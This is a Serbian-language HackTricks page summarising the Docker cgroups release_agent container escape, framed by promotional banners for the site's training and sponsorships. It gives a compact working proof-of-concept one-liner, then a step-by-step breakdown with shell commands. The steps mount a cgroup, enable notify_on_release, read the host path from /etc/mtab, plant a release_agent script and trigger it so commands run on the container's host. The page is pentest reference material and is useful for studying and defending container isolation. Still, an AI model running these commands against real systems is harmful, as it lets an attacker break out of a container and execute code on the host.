# Docker release\_agent cgroups escape

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Za dalje detalje, pogledajte** [**originalni blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Ovo je samo sažetak:

Originalni PoC:

```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

Dokazni koncept (PoC) demonstrira metod za iskorišćavanje cgroups-a kreiranjem `release_agent` fajla i pokretanjem njegovog pozivanja kako bi se izvršile proizvoljne komande na hostu kontejnera. Evo pregleda koraka uključenih u proces:

1. **Priprema okruženja:**

* Kreira se direktorijum `/tmp/cgrp` koji će služiti kao tačka montiranja za cgroup.
* RDMA cgroup kontroler se montira na ovaj direktorijum. U slučaju odsustva RDMA kontrolera, predlaže se korišćenje `memory` cgroup kontrolera kao alternativu.

```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

2. **Postavite podgrupu deteta:**

* Unutar montiranog direktorijuma cgroup, kreirajte podgrupu deteta nazvanu "x".
* Omogućite obaveštenja za podgrupu "x" tako što ćete upisati 1 u njegovu datoteku notify\_on\_release.

```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```

3. **Konfigurišite Release Agent:**

* Putanja kontejnera na hostu se dobija iz fajla /etc/mtab.
* Zatim se konfiguriše release\_agent fajl cgroup-a da izvrši skriptu nazvanu /cmd smeštenu na dobijenoj putanji hosta.

```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

4. **Kreiranje i konfigurisanje skripte /cmd:**

* Skripta /cmd se kreira unutar kontejnera i konfiguriše se da izvrši ps aux, preusmeravajući izlaz u datoteku nazvanu /output unutar kontejnera. Specifikuje se puna putanja /output na hostu.

```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```

5. **Pokrenite napad:**

* Pokreće se proces unutar "x" podgrupe djece i odmah se zaustavlja.
* To pokreće `release_agent` (skriptu /cmd), koja izvršava ps aux na hostu i zapisuje izlaz u /output unutar kontejnera.

```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
